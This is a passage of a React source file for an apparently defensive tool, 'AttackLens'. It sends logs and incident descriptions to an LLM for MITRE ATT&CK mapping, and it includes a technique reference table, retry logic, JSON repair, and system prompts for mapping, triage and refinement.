import React, { useState, useEffect, useMemo, useCallback, useRef } from "react";
import {
  Shield, Search, Upload, Activity, Target, GitBranch, FileText, Database,
  AlertTriangle, ChevronRight, Clock, Trash2, RefreshCw, Download, Copy,
  Check, X, ThumbsUp, ThumbsDown, Filter, Plus, Zap, Eye, BarChart3,
  Layers, Code2, Terminal, Globe, Hash, FileCode, MessageSquare, Sparkles,
  Loader2, ChevronDown, ChevronUp, ExternalLink, Crosshair, Skull, Wand2,
  Tag, StickyNote, Printer, PlayCircle, ListOrdered, Save
} from "lucide-react";

/* ----------------------------------------------------------------- */
/*  window.storage shim — backed by browser localStorage.             */
/*  Works locally, on Netlify, Vercel, GitHub Pages, anywhere.        */
/*  All analyses persist in the user's browser (per-origin).          */
/* ----------------------------------------------------------------- */
if (typeof window !== "undefined" && !window.storage) {
  const ls = () => {
    try { return window.localStorage; } catch { return null; }
  };
  window.storage = {
    async get(key) {
      const store = ls();
      if (!store) throw new Error("localStorage unavailable");
      const v = store.getItem(`attacklens:${key}`);
      if (v === null) throw new Error("Key not found");
      return { key, value: v };
    },
    async set(key, value) {
      const store = ls();
      if (!store) throw new Error("localStorage unavailable");
      try {
        store.setItem(`attacklens:${key}`, value);
      } catch (e) {
        if (e.name === "QuotaExceededError") {
          throw new Error("Browser storage is full. Delete some old analyses to free space.");
        }
        throw e;
      }
      return { key, value };
    },
    async delete(key) {
      const store = ls();
      if (!store) throw new Error("localStorage unavailable");
      store.removeItem(`attacklens:${key}`);
      return { key, deleted: true };
    },
  };
}

/* ----------------------------------------------------------------- */
/*  MITRE ATT&CK Reference Data (real framework structure, Enterprise)*/
/* ----------------------------------------------------------------- */
const TACTICS = [
  { id: "TA0043", name: "Reconnaissance",       short: "recon" },
  { id: "TA0042", name: "Resource Development", short: "resource-dev" },
  { id: "TA0001", name: "Initial Access",       short: "initial-access" },
  { id: "TA0002", name: "Execution",            short: "execution" },
  { id: "TA0003", name: "Persistence",          short: "persistence" },
  { id: "TA0004", name: "Privilege Escalation", short: "priv-esc" },
  { id: "TA0005", name: "Defense Evasion",      short: "defense-evasion" },
  { id: "TA0006", name: "Credential Access",    short: "cred-access" },
  { id: "TA0007", name: "Discovery",            short: "discovery" },
  { id: "TA0008", name: "Lateral Movement",     short: "lateral-movement" },
  { id: "TA0009", name: "Collection",           short: "collection" },
  { id: "TA0011", name: "Command and Control",  short: "c2" },
  { id: "TA0010", name: "Exfiltration",         short: "exfil" },
  { id: "TA0040", name: "Impact",               short: "impact" },
];

// Real MITRE ATT&CK techniques (curated production-relevant subset).
// The LLM may return any technique ID; cells not in this table still render with the ID.
const TECHNIQUES = [
  // Reconnaissance
  { id: "T1595",     name: "Active Scanning",                   tactic: "TA0043" },
  { id: "T1592",     name: "Gather Victim Host Information",    tactic: "TA0043" },
  { id: "T1589",     name: "Gather Victim Identity Info",       tactic: "TA0043" },
  { id: "T1598",     name: "Phishing for Information",          tactic: "TA0043" },
  // Resource Dev
  { id: "T1583",     name: "Acquire Infrastructure",            tactic: "TA0042" },
  { id: "T1586",     name: "Compromise Accounts",               tactic: "TA0042" },
  { id: "T1588",     name: "Obtain Capabilities",               tactic: "TA0042" },
  // Initial Access
  { id: "T1566",     name: "Phishing",                          tactic: "TA0001" },
  { id: "T1566.001", name: "Spearphishing Attachment",          tactic: "TA0001" },
  { id: "T1566.002", name: "Spearphishing Link",                tactic: "TA0001" },
  { id: "T1078",     name: "Valid Accounts",                    tactic: "TA0001" },
  { id: "T1190",     name: "Exploit Public-Facing App",         tactic: "TA0001" },
  { id: "T1133",     name: "External Remote Services",          tactic: "TA0001" },
  { id: "T1195",     name: "Supply Chain Compromise",           tactic: "TA0001" },
  { id: "T1199",     name: "Trusted Relationship",              tactic: "TA0001" },
  // Execution
  { id: "T1059",     name: "Command & Scripting Interpreter",   tactic: "TA0002" },
  { id: "T1059.001", name: "PowerShell",                        tactic: "TA0002" },
  { id: "T1059.003", name: "Windows Command Shell",             tactic: "TA0002" },
  { id: "T1059.004", name: "Unix Shell",                        tactic: "TA0002" },
  { id: "T1059.005", name: "Visual Basic",                      tactic: "TA0002" },
  { id: "T1059.006", name: "Python",                            tactic: "TA0002" },
  { id: "T1059.007", name: "JavaScript",                        tactic: "TA0002" },
  { id: "T1106",     name: "Native API",                        tactic: "TA0002" },
  { id: "T1204",     name: "User Execution",                    tactic: "TA0002" },
  { id: "T1204.002", name: "Malicious File",                    tactic: "TA0002" },
  { id: "T1053",     name: "Scheduled Task/Job",                tactic: "TA0002" },
  { id: "T1053.005", name: "Scheduled Task",                    tactic: "TA0002" },
  { id: "T1569",     name: "System Services",                   tactic: "TA0002" },
  // Persistence
  { id: "T1547",     name: "Boot/Logon Autostart Execution",    tactic: "TA0003" },
  { id: "T1547.001", name: "Registry Run Keys / Startup Folder",tactic: "TA0003" },
  { id: "T1543",     name: "Create or Modify System Process",   tactic: "TA0003" },
  { id: "T1543.003", name: "Windows Service",                   tactic: "TA0003" },
  { id: "T1136",     name: "Create Account",                    tactic: "TA0003" },
  { id: "T1098",     name: "Account Manipulation",              tactic: "TA0003" },
  { id: "T1505",     name: "Server Software Component",         tactic: "TA0003" },
  { id: "T1505.003", name: "Web Shell",                         tactic: "TA0003" },
  { id: "T1574",     name: "Hijack Execution Flow",             tactic: "TA0003" },
  { id: "T1574.002", name: "DLL Side-Loading",                  tactic: "TA0003" },
  // Privilege Escalation
  { id: "T1068",     name: "Exploitation for Priv Escalation",  tactic: "TA0004" },
  { id: "T1548",     name: "Abuse Elevation Control Mechanism", tactic: "TA0004" },
  { id: "T1548.002", name: "UAC Bypass",                        tactic: "TA0004" },
  { id: "T1055",     name: "Process Injection",                 tactic: "TA0004" },
  { id: "T1134",     name: "Access Token Manipulation",         tactic: "TA0004" },
  // Defense Evasion
  { id: "T1027",     name: "Obfuscated Files or Information",   tactic: "TA0005" },
  { id: "T1070",     name: "Indicator Removal",                 tactic: "TA0005" },
  { id: "T1070.001", name: "Clear Windows Event Logs",          tactic: "TA0005" },
  { id: "T1112",     name: "Modify Registry",                   tactic: "TA0005" },
  { id: "T1218",     name: "System Binary Proxy Execution",     tactic: "TA0005" },
  { id: "T1218.011", name: "Rundll32",                          tactic: "TA0005" },
  { id: "T1562",     name: "Impair Defenses",                   tactic: "TA0005" },
  { id: "T1562.001", name: "Disable or Modify Tools",           tactic: "TA0005" },
  { id: "T1140",     name: "Deobfuscate/Decode Files",          tactic: "TA0005" },
  { id: "T1036",     name: "Masquerading",                      tactic: "TA0005" },
  // Credential Access
  { id: "T1003",     name: "OS Credential Dumping",             tactic: "TA0006" },
  { id: "T1003.001", name: "LSASS Memory",                      tactic: "TA0006" },
  { id: "T1110",     name: "Brute Force",                       tactic: "TA0006" },
  { id: "T1110.003", name: "Password Spraying",                 tactic: "TA0006" },
  { id: "T1558",     name: "Steal/Forge Kerberos Tickets",      tactic: "TA0006" },
  { id: "T1558.003", name: "Kerberoasting",                     tactic: "TA0006" },
  { id: "T1555",     name: "Credentials from Password Stores",  tactic: "TA0006" },
  { id: "T1056",     name: "Input Capture",                     tactic: "TA0006" },
  // Discovery
  { id: "T1083",     name: "File and Directory Discovery",      tactic: "TA0007" },
  { id: "T1057",     name: "Process Discovery",                 tactic: "TA0007" },
  { id: "T1018",     name: "Remote System Discovery",           tactic: "TA0007" },
  { id: "T1082",     name: "System Information Discovery",      tactic: "TA0007" },
  { id: "T1016",     name: "System Network Configuration",      tactic: "TA0007" },
  { id: "T1087",     name: "Account Discovery",                 tactic: "TA0007" },
  { id: "T1033",     name: "System Owner/User Discovery",       tactic: "TA0007" },
  // Lateral Movement
  { id: "T1021",     name: "Remote Services",                   tactic: "TA0008" },
  { id: "T1021.001", name: "Remote Desktop Protocol",           tactic: "TA0008" },
  { id: "T1021.002", name: "SMB/Windows Admin Shares",          tactic: "TA0008" },
  { id: "T1021.004", name: "SSH",                               tactic: "TA0008" },
  { id: "T1021.006", name: "Windows Remote Management",         tactic: "TA0008" },
  { id: "T1570",     name: "Lateral Tool Transfer",             tactic: "TA0008" },
  { id: "T1534",     name: "Internal Spearphishing",            tactic: "TA0008" },
  // Collection
  { id: "T1005",     name: "Data from Local System",            tactic: "TA0009" },
  { id: "T1113",     name: "Screen Capture",                    tactic: "TA0009" },
  { id: "T1115",     name: "Clipboard Data",                    tactic: "TA0009" },
  { id: "T1560",     name: "Archive Collected Data",            tactic: "TA0009" },
  // C2
  { id: "T1071",     name: "Application Layer Protocol",        tactic: "TA0011" },
  { id: "T1071.001", name: "Web Protocols",                     tactic: "TA0011" },
  { id: "T1071.004", name: "DNS",                               tactic: "TA0011" },
  { id: "T1573",     name: "Encrypted Channel",                 tactic: "TA0011" },
  { id: "T1105",     name: "Ingress Tool Transfer",             tactic: "TA0011" },
  { id: "T1090",     name: "Proxy",                             tactic: "TA0011" },
  { id: "T1572",     name: "Protocol Tunneling",                tactic: "TA0011" },
  // Exfiltration
  { id: "T1041",     name: "Exfil Over C2 Channel",             tactic: "TA0010" },
  { id: "T1048",     name: "Exfil Over Alternative Protocol",   tactic: "TA0010" },
  { id: "T1567",     name: "Exfil Over Web Service",            tactic: "TA0010" },
  // Impact
  { id: "T1486",     name: "Data Encrypted for Impact",         tactic: "TA0040" },
  { id: "T1490",     name: "Inhibit System Recovery",           tactic: "TA0040" },
  { id: "T1485",     name: "Data Destruction",                  tactic: "TA0040" },
  { id: "T1489",     name: "Service Stop",                      tactic: "TA0040" },
  { id: "T1657",     name: "Financial Theft",                   tactic: "TA0040" },
];

const TECH_BY_ID = TECHNIQUES.reduce((acc, t) => (acc[t.id] = t, acc), {});
const TACTIC_BY_ID = TACTICS.reduce((acc, t) => (acc[t.id] = t, acc), {});
const TECHS_BY_TACTIC = TACTICS.reduce((acc, t) => {
  acc[t.id] = TECHNIQUES.filter(x => x.tactic === t.id);
  return acc;
}, {});

/* ----------------------------------------------------------------- */
/*  Severity / color helpers                                          */
/* ----------------------------------------------------------------- */
const sevColor = (s) => {
  if (s == null) return "text-zinc-500";
  if (s >= 90) return "text-fuchsia-400";
  if (s >= 75) return "text-red-400";
  if (s >= 50) return "text-orange-400";
  if (s >= 25) return "text-amber-400";
  return "text-emerald-400";
};
const sevBg = (s) => {
  if (s == null) return "bg-zinc-800";
  if (s >= 90) return "bg-fuchsia-500/20 border-fuchsia-500/40";
  if (s >= 75) return "bg-red-500/20 border-red-500/40";
  if (s >= 50) return "bg-orange-500/20 border-orange-500/40";
  if (s >= 25) return "bg-amber-500/20 border-amber-500/40";
  return "bg-emerald-500/20 border-emerald-500/40";
};
const sevDot = (s) => {
  if (s == null) return "bg-zinc-600";
  if (s >= 90) return "bg-fuchsia-400";
  if (s >= 75) return "bg-red-400";
  if (s >= 50) return "bg-orange-400";
  if (s >= 25) return "bg-amber-400";
  return "bg-emerald-400";
};
const sevLabel = (s) => {
  if (s >= 90) return "Critical";
  if (s >= 75) return "High";
  if (s >= 50) return "Medium";
  if (s >= 25) return "Low";
  return "Info";
};

/* ----------------------------------------------------------------- */
/*  Persistent storage layer (real, via window.storage)               */
/* ----------------------------------------------------------------- */
const storage = {
  async listAnalyses() {
    try {
      const r = await window.storage.get("analyses:index");
      return r ? JSON.parse(r.value) : [];
    } catch { return []; }
  },
  async saveAnalysis(a) {
    const idx = await storage.listAnalyses();
    const entry = {
      id: a.id, title: a.title, created_at: a.created_at,
      severity: a.severity, input_type: a.input_type,
      tags: a.tags || [], notes: (a.notes || "").slice(0, 200),
      status: a.status || "open",
    };
    const filtered = idx.filter(x => x.id !== a.id);
    const newIdx = [entry, ...filtered].slice(0, 200);
    await window.storage.set("analyses:index", JSON.stringify(newIdx));
    await window.storage.set(`analysis:${a.id}`, JSON.stringify(a));
  },
  async updateAnalysisMeta(id, patch) {
    const full = await storage.getAnalysis(id);
    if (!full) return null;
    const updated = { ...full, ...patch, updated_at: new Date().toISOString() };
    await storage.saveAnalysis(updated);
    return updated;
  },
  async getAnalysis(id) {
    try {
      const r = await window.storage.get(`analysis:${id}`);
      return r ? JSON.parse(r.value) : null;
    } catch { return null; }
  },
  async deleteAnalysis(id) {
    try {
      await window.storage.delete(`analysis:${id}`);
      await window.storage.delete(`feedback:${id}`);
      const idx = await storage.listAnalyses();
      await window.storage.set("analyses:index", JSON.stringify(idx.filter(x => x.id !== id)));
    } catch {}
  },
  async saveFeedback(analysisId, feedback) {
    await window.storage.set(`feedback:${analysisId}`, JSON.stringify(feedback));
  },
  async getFeedback(analysisId) {
    try {
      const r = await window.storage.get(`feedback:${analysisId}`);
      return r ? JSON.parse(r.value) : {};
    } catch { return {}; }
  },
};

/* ----------------------------------------------------------------- */
/*  Real LLM analysis via Anthropic API                               */
/* ----------------------------------------------------------------- */
const ANALYSIS_SYSTEM_PROMPT = `You are AttackLens-Mapper, a senior detection engineering and threat hunting AI. You map adversary behavior, raw telemetry, attack descriptions, IOCs, and detection rules to MITRE ATT&CK Enterprise (v14+) techniques.

Hard rules:
- Return ONLY valid JSON matching the schema below. No prose outside JSON. No markdown fences.
- Use real MITRE ATT&CK technique IDs (Txxxx or Txxxx.yyy). Never invent IDs.
- Use real tactic IDs: TA0001 Initial Access, TA0002 Execution, TA0003 Persistence, TA0004 Privilege Escalation, TA0005 Defense Evasion, TA0006 Credential Access, TA0007 Discovery, TA0008 Lateral Movement, TA0009 Collection, TA0011 Command and Control, TA0010 Exfiltration, TA0040 Impact, TA0043 Reconnaissance, TA0042 Resource Development.
- Use sub-technique IDs when evidence supports it (e.g., T1059.001 PowerShell, T1003.001 LSASS Memory).
- Confidence reflects evidence strength: 0.95+ direct match, 0.70-0.94 strong behavioral, 0.40-0.69 candidate.
- Severity 0-100: account for technique impact + criticality (e.g., T1486 ransomware always 95-100; T1083 file discovery 30-50).
- Evidence excerpts must quote actual phrases or log lines from the input.
- Generate working Sigma rules in proper YAML format with title, id, status, tags (attack.taXXXX, attack.tXXXX), logsource (product/service/category), detection (selection/condition), level.
- Generate kill chain ordering only when ordering is inferable; otherwise empty array.

Schema:
{
  "title": "concise title 6-10 words",
  "summary": "2-3 sentence analyst-grade summary",
  "narrative": "detailed kill-chain narrative 4-8 sentences referencing technique IDs inline",
  "input_classification": "raw_logs | attack_name | ioc | nl_incident | detection_rule | event_id | simulation",
  "detected_format": "sysmon | winlog | linux_auth | firewall | proxy | edr | ids_ips | cloud_aws | cloud_azure | cloud_gcp | sigma | spl | json | text | unknown",
  "platforms": ["Windows" | "Linux" | "macOS" | "Cloud" | "Network"],
  "severity": 0-100,
  "confidence": 0.0-1.0,
  "risk_score": 0-100,
  "mappings": [
    {
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "confidence": 0.0-1.0,
      "severity": 0-100,
      "evidence": ["quoted excerpt or behavioral indicator"],
      "reasoning": "1-2 sentence justification grounded in input",
      "source_engine": "rule | ml | llm | hybrid"
    }
  ],
  "chain": [
    { "order": 1, "technique_id": "T1566.002", "description": "what happened at this step", "timestamp": "ISO8601 if known else empty string", "host": "hostname if applicable else empty", "actor": "user/process if applicable else empty" }
  ],
  "iocs": [
    { "type": "ip|domain|url|hash_md5|hash_sha1|hash_sha256|email|filename|registry|mutex", "value": "...", "context": "..." }
  ],
  "detections": [
    {
      "technique_id": "T1059.001",
      "format": "sigma",
      "title": "rule title",
      "description": "what it detects",
      "log_source": { "product": "windows", "service": "sysmon", "category": "process_creation" },
      "content": "full Sigma YAML",
      "splunk_spl": "equivalent SPL query",
      "kql": "equivalent Microsoft KQL query"
    }
  ],
  "threat_actors": [
    { "name": "APT29", "similarity": 0.0-1.0, "reasoning": "shared TTPs and tradecraft pattern" }
  ],
  "recommendations": [
    "actionable hunting/hardening recommendation"
  ]
}`;

// HTTP statuses that warrant retry (transient capacity / network issues)
const RETRYABLE_STATUSES = new Set([408, 429, 500, 502, 503, 504, 529]);
const MAX_RETRIES = 6;

// Sleep with cancellation via abort signal
const sleep = (ms, signal) => new Promise((resolve, reject) => {
  const id = setTimeout(resolve, ms);
  if (signal) signal.addEventListener("abort", () => { clearTimeout(id); reject(new Error("aborted")); });
});

// Calculate backoff: 1s, 2s, 4s, 8s, 15s, 25s (capped) + 0-500ms jitter
const backoffDelay = (attempt) => {
  const base = Math.min(1000 * Math.pow(2, attempt), 25000);
  const jitter = Math.random() * 500;
  return Math.floor(base + jitter);
};

async function callClaudeWithRetry(requestBody, onRetry, signal) {
  let lastError;
  for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
    if (signal?.aborted) throw new Error("Cancelled");

    if (attempt > 0) {
      const delay = backoffDelay(attempt - 1);
      onRetry?.({ attempt, maxRetries: MAX_RETRIES, delayMs: delay, reason: lastError?.message || "" });
      try { await sleep(delay, signal); } catch { throw new Error("Cancelled"); }
    }

    try {
      const response = await fetch("/api/llm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestBody),
        signal,
      });

      const ct = response.headers.get("content-type") || "";

      if (response.ok) {
        if (!ct.includes("application/json")) {
          const preview = (await response.text()).slice(0, 200);
          throw Object.assign(new Error(
            `Backend returned non-JSON (content-type: ${ct}). The /api/llm route is probably not configured on this host.\n\nPreview: ${preview}`
          ), { status: 0, transient: false });
        }
        return await response.json();
      }

      // Read once; detect HTML 404 from a misconfigured host
      const errText = await response.text();
      let friendlyHint = "";
      if (response.status === 404 && (ct.includes("text/html") || errText.trim().startsWith("<"))) {
        friendlyHint =
          "\n\nThis usually means the serverless function /api/llm is not deployed. " +
          "On Netlify: confirm netlify/functions/llm.js exists and ANTHROPIC_API_KEY is set in Site settings → Environment variables.";
      } else if (response.status === 401 || response.status === 403) {
        friendlyHint = "\n\nCheck that ANTHROPIC_API_KEY is set correctly (starts with sk-ant-).";
      } else if (response.status === 500 && errText.includes("ANTHROPIC_API_KEY")) {
        friendlyHint = "\n\nThe serverless function is missing the ANTHROPIC_API_KEY environment variable.";
      }

      const err = new Error(`API ${response.status}: ${errText.slice(0, 200)}${friendlyHint}`);
      err.status = response.status;
      err.transient = RETRYABLE_STATUSES.has(response.status);
      lastError = err;
      if (!err.transient) throw err;            // permanent → bail
    } catch (e) {
      if (e.name === "AbortError") throw new Error("Cancelled");
      lastError = e;
      // Network errors (fetch threw before getting a response) — treat as transient
      if (typeof e.status === "number" && !RETRYABLE_STATUSES.has(e.status)) throw e;
    }
  }
  // Exhausted retries
  const e = new Error(
    lastError?.status === 529
      ? "Anthropic API is overloaded right now. We retried " + MAX_RETRIES + " times. Try again in 30-60 seconds."
      : (lastError?.message || "Analysis failed after retries.")
  );
  e.cause = lastError;
  throw e;
}

/* ----------------------------------------------------------------- */
/*  Robust JSON extraction with truncation repair                     */
/* ----------------------------------------------------------------- */
function extractAndRepairJSON(rawText) {
  // Strip markdown fences if present
  let text = rawText.replace(/^```(?:json)?\s*/i, "").replace(/```\s*$/i, "").trim();

  // Find the outermost JSON object boundaries
  const start = text.indexOf("{");
  if (start < 0) throw new Error("No JSON object found in LLM response");
  text = text.slice(start);

  // Fast path: try parsing as-is (with last } as end)
  const lastClose = text.lastIndexOf("}");
  if (lastClose > 0) {
    try { return JSON.parse(text.slice(0, lastClose + 1)); } catch {}
  }

  // Repair path: walk the string, track brace/bracket/string state,
  // and synthesize closing characters for any unclosed structures.
  // This recovers truncated JSON responses (the common case when output is cut off).
  const stack = [];
  let inString = false;
  let escape = false;
  let lastValidEnd = -1;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (escape) { escape = false; continue; }
    if (ch === "\\" && inString) { escape = true; continue; }
    if (ch === '"') { inString = !inString; continue; }
    if (inString) continue;
    if (ch === "{" || ch === "[") stack.push(ch);
    else if (ch === "}" || ch === "]") {
      stack.pop();
      if (stack.length === 0) lastValidEnd = i;
    }
  }

  // Build a repaired string: close any open string, trim trailing comma/colon, close all open structures
  let repaired = text;
  if (inString) repaired += '"';

  // Trim trailing partial tokens: dangling comma, colon, or whitespace
  repaired = repaired.replace(/[,:\s]+$/, "");
  // If we ended mid-key (e.g. `"foo": `), drop that partial pair back to the last comma or open brace
  // Heuristic: find the last `,` or `{` or `[` and trim back to just before incomplete content
  const lastSafeChar = Math.max(
    repaired.lastIndexOf(","),
    repaired.lastIndexOf("{"),
    repaired.lastIndexOf("["),
  );
  // Detect "key": <incomplete> pattern and trim it
  const tail = repaired.slice(lastSafeChar + 1);
  if (/^\s*"[^"]*"\s*:\s*[^,\}\]]*$/.test(tail) && !/[}\]"\d]\s*$/.test(repaired)) {
    repaired = repaired.slice(0, lastSafeChar);
  }
  repaired = repaired.replace(/,\s*$/, "");

  // Close open structures in reverse
  while (stack.length > 0) {
    const open = stack.pop();
    repaired += open === "{" ? "}" : "]";
  }

  try { return JSON.parse(repaired); } catch {}

  // Last resort: try parsing just up to the last cleanly closed structure
  if (lastValidEnd > 0) {
    try { return JSON.parse(text.slice(0, lastValidEnd + 1)); } catch {}
  }

  throw new Error("Could not parse or repair LLM JSON response");
}

async function runAnalysis(inputType, inputContent, context = {}, callbacks = {}) {
  const { onRetry, signal } = callbacks;

  const userPrompt = `Analyze the following input and produce a complete MITRE ATT&CK mapping.

INPUT TYPE: ${inputType}
${context.title ? `ANALYST TITLE: ${context.title}\n` : ""}
${context.platforms?.length ? `PLATFORMS HINT: ${context.platforms.join(", ")}\n` : ""}

INPUT:
${inputContent}

CRITICAL OUTPUT RULES:
- Return ONLY the JSON object. No prose, no markdown fences, no commentary.
- Keep within the token budget: cap mappings to the most important 6-10, detections to 3-5 most useful.
- For each detection, provide Sigma + at most one of (Splunk SPL or KQL), not both, unless space permits.
- Keep reasoning/evidence concise (1-2 sentences each). Quality over quantity.
- ENSURE the JSON is fully closed at the end — every opening brace/bracket must have a matching close.`;

  const data = await callClaudeWithRetry({
    model: "claude-sonnet-4-20250514",
    max_tokens: 8192,
    system: ANALYSIS_SYSTEM_PROMPT,
    messages: [{ role: "user", content: userPrompt }],
  }, onRetry, signal);

  const text = (data.content || [])
    .filter(b => b.type === "text")
    .map(b => b.text)
    .join("\n")
    .trim();

  const wasTruncated = data.stop_reason === "max_tokens";

  try {
    const parsed = extractAndRepairJSON(text);
    if (wasTruncated) {
      parsed._truncated = true;  // mark for UI indication
    }
    return parsed;
  } catch (e) {
    const hint = wasTruncated
      ? "Response was truncated by the model token limit. Try a shorter input or use the Refine tool to trim noise."
      : "Try again — usually resolves on retry.";
    throw new Error(`Could not parse model response. ${hint}\n\nPreview: ${text.slice(0, 250)}…`);
  }
}

/* ----------------------------------------------------------------- */
/*  Triage: decide if a natural-language input has enough detail for  */
/*  MITRE mapping. If not, generate friendly follow-up questions.     */
/* ----------------------------------------------------------------- */
const TRIAGE_SYSTEM_PROMPT = `You are AttackLens-Triage, a friendly security analyst helping non-experts describe what happened on their computer or network. Your job is to decide whether the user's description has enough detail to map to MITRE ATT&CK techniques. If not, you ask up to 4 plain-English follow-up questions to fill the gaps.

Decision rules:
- "ready=true" when the description mentions at least one concrete adversary behavior: a file opened/downloaded, a program/process running, a website visited, a login or credential event, a network connection, ransomware/encryption symptoms, account changes, suspicious popups, unusual emails, unexpected admin actions, etc. Vague descriptions with even ONE concrete signal still qualify.
- "ready=false" when the description is purely about symptoms with no security-relevant context ("my computer is slow", "something feels off", "I think I was hacked" with no detail).
- NEVER ask more than 4 questions per round. Be precise about what's missing.
- Questions must be in PLAIN ENGLISH. NO security jargon. NO acronyms. Avoid words like "TTP", "C2", "lateral movement", "credential dumping", "LSASS", "Sysmon", "Event ID", "exfiltration".
- For every question, provide 2-3 concrete example answers a non-technical user could relate to.
- Tailor the questions to what the user already said. Don't ask generic questionnaire items.
- Include a 'category' tag for each question from this set: "what_happened", "how_it_started", "what_you_saw", "system_changes", "network_activity", "files_or_data", "accounts_or_logins", "timing".

Return ONLY this JSON, no prose, no markdown:
{
  "ready": true | false,
  "reason": "short reason for the decision, friendly tone",
  "what_we_understood": "1-2 sentence summary of what you DID understand from the input (empty string if ready=false and nothing usable)",
  "questions": [
    {
      "category": "what_you_saw",
      "question": "plain English question",
      "why_we_ask": "1 sentence on why this helps (analyst tone, no jargon)",
      "examples": ["example user-friendly answer 1", "example 2", "example 3"]
    }
  ]
}

If ready=true, return "questions": [].`;

async function triageNLInput(rawText, callbacks = {}) {
  const data = await callClaudeWithRetry({
    model: "claude-sonnet-4-20250514",
    max_tokens: 1500,
    system: TRIAGE_SYSTEM_PROMPT,
    messages: [{ role: "user", content: `User's description:\n\n${rawText}\n\nReturn the JSON now.` }],
  }, callbacks.onRetry, callbacks.signal);

  const text = (data.content || []).filter(b => b.type === "text").map(b => b.text).join("\n").trim();
  try { return extractAndRepairJSON(text); }
  catch (err) { throw new Error("Triage step returned malformed JSON. Retry usually resolves this."); }
}

/* ----------------------------------------------------------------- */
/*  Refine: take any messy/rough text (interview scenarios, free     */
/*  notes, screenshots-as-text, etc.) and produce a clean, structured */
/*  security incident description ready for MITRE mapping.            */
/* ----------------------------------------------------------------- */
const REFINE_SYSTEM_PROMPT = `You are AttackLens-Refiner, a senior SOC analyst who takes ROUGH, MESSY, INFORMAL descriptions of security incidents and rewrites them into clean, structured, analyst-grade narratives ready for MITRE ATT&CK mapping.

What you receive: anything — half-finished interview scenarios, panicked user reports, dumped chat logs, screenshot OCR, bullet notes, broken English, mixed languages, etc.

What you produce: a well-organized incident description that:
- Preserves EVERY factual detail from the original (no detail is dropped)
- Re-orders events chronologically when ordering is clear
- Normalizes vocabulary (so "weird popup" becomes "unexpected popup window", but stays plain enough that non-experts can read it)
- Groups facts by phase (initial access, what happened next, what was observed, what was affected)
- Calls out concrete indicators inline: process names, IP addresses, domains, file hashes, user accounts, hostnames, timestamps — anything that looks like an IOC
- Flags ambiguities or gaps as explicit "Unknown / Not stated" lines so the analyzer knows what isn't known
- Does NOT invent technique IDs, attack names, or facts not present in the input
- Does NOT add security jargon the user didn't use (no "lateral movement", "C2", "exfiltration" unless those words were already there)
- Writes in third person, professional tone

Return ONLY this JSON, no prose, no markdown fences:
{
  "refined_text": "the clean structured description, 1-4 paragraphs",
  "extracted": {
    "timestamps": ["any time/date references found"],
    "hosts_or_systems": ["machine names, server names, OS hints"],
    "users_or_accounts": ["usernames, email addresses, account identifiers"],
    "processes_or_programs": ["named processes, executables, scripts"],
    "files": ["filenames, paths, attachments, extensions"],
    "network": ["IP addresses, domains, URLs, ports, protocols"],
    "observed_behaviors": ["what the user saw happening — popups, errors, slowdowns, locked files, etc."],
    "actions_taken": ["what anyone did in response — clicked, opened, ignored, reported"]
  },
  "gaps": [
    "specific piece of information that would help analysis but is missing"
  ],
  "suggested_title": "concise 6-10 word title for this incident",
  "confidence_in_refinement": 0.0-1.0
}

Empty arrays are fine. If a section has no data, return [].`;

async function refineInput(rawText, callbacks = {}) {
  const data = await callClaudeWithRetry({
    model: "claude-sonnet-4-20250514",
    max_tokens: 3000,
    system: REFINE_SYSTEM_PROMPT,
    messages: [{ role: "user", content: `Rough input to refine:\n\n${rawText}\n\nReturn the JSON now.` }],
  }, callbacks.onRetry, callbacks.signal);

  const text = (data.content || []).filter(b => b.type === "text").map(b => b.text).join("\n").trim();
  try { return extractAndRepairJSON(text); }
  catch (err) { throw new Error("Refiner returned malformed JSON. Try again."); }
}

/* ----------------------------------------------------------------- */
/*  Small UI primitives                                               */
/* ----------------------------------------------------------------- */
const Pill = ({ children, className = "" }) => (
  <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-medium uppercase tracking-wider border ${className}`}>
    {children}
  </span>
);

const Card = ({ children, className = "" }) => (
  <div className={`bg-zinc-900/60 border border-zinc-800 rounded-lg ${className}`}>
    {children}
  </div>
);

const Button = ({ children, onClick, variant = "primary", disabled, className = "", icon: Icon, type = "button" }) => {
  const base = "inline-flex items-center justify-center gap-2 px-3.5 py-2 rounded-md text-sm font-medium transition-all disabled:opacity-40 disabled:cursor-not-allowed";
  const variants = {
    primary: "bg-cyan-500 hover:bg-cyan-400 text-zinc-950 shadow-lg shadow-cyan-500/20",
    ghost:   "bg-transparent hover:bg-zinc-800 text-zinc-300 border border-zinc-800",
    danger:  "bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30",
    subtle:  "bg-zinc-800 hover:bg-zinc-700 text-zinc-200",
  };
  return (
    <button type={type} onClick={onClick} disabled={disabled} className={`${base} ${variants[variant]} ${className}`}>
      {Icon && <Icon size={15} />}{children}
    </button>
  );
};

const Spinner = ({ size = 16 }) => <Loader2 size={size} className="animate-spin" />;

const Tooltip = ({ text, children }) => (
  <div className="group relative inline-flex">
    {children}
    <div className="pointer-events-none absolute bottom-full left-1/2 -translate-x-1/2 mb-2 hidden group-hover:block z-50">
      <div className="bg-zinc-950 border border-zinc-700 text-zinc-200 text-xs px-2 py-1 rounded whitespace-nowrap shadow-xl">{text}</div>
    </div>
  </div>
);

/* ----------------------------------------------------------------- */
/*  Sidebar nav                                                        */
/* ----------------------------------------------------------------- */
const NAV = [
  { id: "dashboard", label: "Dashboard", icon: Activity },
  { id: "refine",    label: "Refine Input", icon: Wand2, featured: true },
  { id: "analyze",   label: "New Analysis", icon: Plus },
  { id: "matrix",    label: "ATT&CK Matrix", icon: Layers },
  { id: "history",   label: "History", icon: Clock },
];

const Sidebar = ({ view, setView, count }) => (
  <aside className="w-56 bg-zinc-950/80 border-r border-zinc-800/80 flex flex-col">
    <div className="px-4 py-5 border-b border-zinc-800/80">
      <div className="flex items-center gap-2">
        <div className="w-7 h-7 rounded bg-gradient-to-br from-cyan-400 to-fuchsia-500 flex items-center justify-center">
          <Shield size={16} className="text-zinc-950" strokeWidth={2.5} />
        </div>
        <div>
          <div className="text-sm font-semibold text-zinc-100 tracking-tight">AttackLens</div>
